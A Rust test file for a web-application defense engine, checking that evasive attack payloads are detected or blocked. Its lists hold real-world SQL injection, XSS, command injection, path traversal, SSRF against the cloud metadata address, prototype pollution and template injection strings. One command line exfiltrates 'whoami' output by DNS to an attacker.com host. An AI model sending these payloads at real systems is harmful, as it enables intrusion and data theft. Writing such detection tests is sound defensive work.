use invariant_engine::runtime::{DefenseAction, UnifiedRequest, UnifiedRuntime};
use invariant_engine::types::InputContext;

fn make_request(input: &str, known_context: Option<InputContext>) -> UnifiedRequest {
    UnifiedRequest {
        input: input.to_string(),
        source_hash: "adversarial_test_source".into(),
        method: "POST".into(),
        path: "/api/test".into(),
        content_type: Some("application/json".into()),
        known_context,
        headers: Vec::new(),
        user_agent: None,
        ja3: None,
        source_reputation: None,
        detected_tech: None,
        param_name: None,
        rasp_context: None,
        response_status: None,
        response_headers: None,
        response_body: None,
        recent_paths: Vec::new(),
        recent_intervals_ms: Vec::new(),
        timestamp: 1_000,
    }
}

fn assert_evasion_detected(
    rt: &mut UnifiedRuntime,
    category: &str,
    payload: &str,
    known_context: Option<InputContext>,
) {
    let response = rt.process(&make_request(payload, known_context));
    let has_high_confidence_match = response
        .analysis
        .matches
        .iter()
        .any(|m| m.confidence > 0.5);
    let should_block = response.analysis.recommendation.block
        || response.decision.action >= DefenseAction::Block;

    assert!(
        has_high_confidence_match || should_block,
        "Evasion succeeded for category={category}, payload={payload:?}; top_conf={:.3}, block={}, action={:?}, matches={:?}",
        response
            .analysis
            .matches
            .iter()
            .map(|m| m.confidence)
            .fold(0.0_f64, f64::max),
        response.analysis.recommendation.block,
        response.decision.action,
        response
            .analysis
            .matches
            .iter()
            .map(|m| format!("{:?}:{:.3}", m.class, m.confidence))
            .collect::<Vec<_>>()
    );
}

#[test]
fn sqli_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "SE/**/LECT * FROM users WHERE id=1",
        "' UnIoN SeLeCt username, password FrOm users--",
        "ＳＥＬＥＣＴ username FROM users",
        "/*!50000SELECT*/ user, pass FROM users",
        "1\r\nUNION SELECT username,password FROM users--",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "sqli", payload, Some(InputContext::Sql));
    }
}

#[test]
fn xss_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "<scr\0ipt>alert(1)</scr\0ipt>",
        "&lt;script&gt;alert(1)&lt;/script&gt;<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<style>div{width:expression(alert(1))}</style>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "xss", payload, Some(InputContext::Html));
    }
}

#[test]
fn command_injection_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "${IFS}cat${IFS}/etc/passwd",
        "{cat,/etc/passwd}",
        "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
        "bash.exe -c cmd /c whoami",
        "nslookup $(whoami).mukund-thiru.attacker.com",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "cmdi", payload, Some(InputContext::Shell));
    }
}

#[test]
fn path_traversal_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "%252e%252e%252fetc%252fpasswd",
        "..%c0%afetc%c0%afpasswd",
        "../../etc/passwd%00.jpg",
        "\\\\server\\share\\..\\etc\\passwd",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "path", payload, Some(InputContext::Url));
    }
}

#[test]
fn ssrf_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "http://2130706433/admin",
        "http://0177.0.0.1/admin",
        "http://[::1]/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "ssrf", payload, Some(InputContext::Url));
    }
}

#[test]
fn prototype_pollution_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "__proto__[isAdmin]=true",
        "constructor.prototype.admin=1",
        r#"{"__proto__":{"isAdmin":true}}"#,
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "proto_pollution", payload, Some(InputContext::Json));
    }
}

#[test]
fn template_injection_evasions_are_detected() {
    let mut rt = UnifiedRuntime::new();
    let payloads = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%=system('id')%>",
        "{php}phpinfo();system('id');{/php}",
    ];

    for payload in payloads {
        assert_evasion_detected(&mut rt, "ssti", payload, Some(InputContext::Template));
    }
}
